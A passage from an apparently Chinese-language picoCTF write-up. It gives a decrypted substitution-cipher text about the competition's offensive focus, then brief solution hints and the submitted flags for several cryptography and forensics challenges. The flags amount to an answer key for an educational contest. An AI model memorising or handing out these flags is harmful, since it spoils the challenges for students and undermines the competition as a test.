iugsijhgugzdhzkgvjewjhjbrqujnnjmgeajxrqugjqmvehcgvjbgzqmgeajxrgvehdxedjqhqggqmdjwpemzmgneuqhznnjhue
ajxrzwejhgjivecvumvzzxmzbpsgjwujmswegrmzbpjgegezhgvqgujjdugzcjhjwqgjehgjwjugehmzbpsgjwumejhmjqbzhcv
ecvumvzzxjwugjqmvehcgvjbjhzscvqfzsgmzbpsgjwujmswegrgzpelsjgvjewmswezuegrbzgeaqgehcgvjbgzjopxzwjzhgv
jewzkhqhijhqfxehcgvjbgzfjggjwijnjhigvjewbqmvehjugvjnxqceupemzMGN{H6W4B_4H41R515_15_73I10S5_8J1FN808}

thereexistseveralotherwellestablishedhighschoolcomputersecuritycompetitionsincludingcyberpatriotand
uscyberchallengethesecompetitionsfocusprimarilyonsystemsadministrationfundamentalswhichareveryusefu
landmarketableskillshoweverwebelievetheproperpurposeofahighschoolcomputersecuritycompetitionisnoton
lytoteachvaluableskillsbutalsotogetstudentsinterestedinandexcitedaboutcomputersciencedefensivecompe
titionsareoftenlaboriousaffairsandcomedowntorunningchecklistsandexecutingconfigscriptsoffenseontheo
therhandisheavilyfocusedonexplorationandimprovisationandoftenhaselementsofplaywebelieveacompetition
touchingontheoffensiveelementsofcomputersecurityisthereforeabettervehiclefortechevangelismtostudent
sinamericanhighschoolsfurtherwebelievethatanunderstandingofoffensivetechniquesisessentialformountin
ganeffectivedefenseandthatthetoolsandconfigurationfocusencounteredindefensivecompetitionsdoesnotlea
dstudentstoknowtheirenemyaseffectivelyasteachingthemtoactivelythinklikeanattackerpicoctfisanoffensi
velyorientedhighschoolcomputersecuritycompetitionthatseekstogenerateinterestincomputerscienceamongh
ighschoolersteachingthemenoughaboutcomputersecuritytopiquetheircuriositymotivatingthemtoexploreonth
eirownandenablingthemtobetterdefendtheirmachinestheflagispico???????????????????????????????????????
```

picoCTF{N6R4M_4N41Y515_15_73D10U5_8E1BF808}

## 9. transposition-trial

移位密码，3字节一组。

picoCTF{7R4N5P051N6_15_3XP3N51V3_56E6924A}

## 10. Vigenere

维吉尼亚密码。key = CYLAB

picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_ae82272q}

# 5. Forensics 部分
这个部分应该是杂项。

## 1. Enhance!

浏览器打开svg然后F12调源码。

picoCTF{3nh4nc3d_aab729dd}

## 3. Lookey here

字符串查找完事。

picoCTF{gr3p_15_@w3s0m3_4c479940}

## 4. Packets primer

Wireshark。

picoCTF{p4ck37_5h4rk_ceccaa7f}

## 5. Redaction gone wrong

选中复制就行了。

picoCTF{C4n_Y0u_S33_m3_fully}

## 6. Sleuthkit Intro

mmls获取信息之后nc填进去就行了

picoCTF{mm15_f7w!}
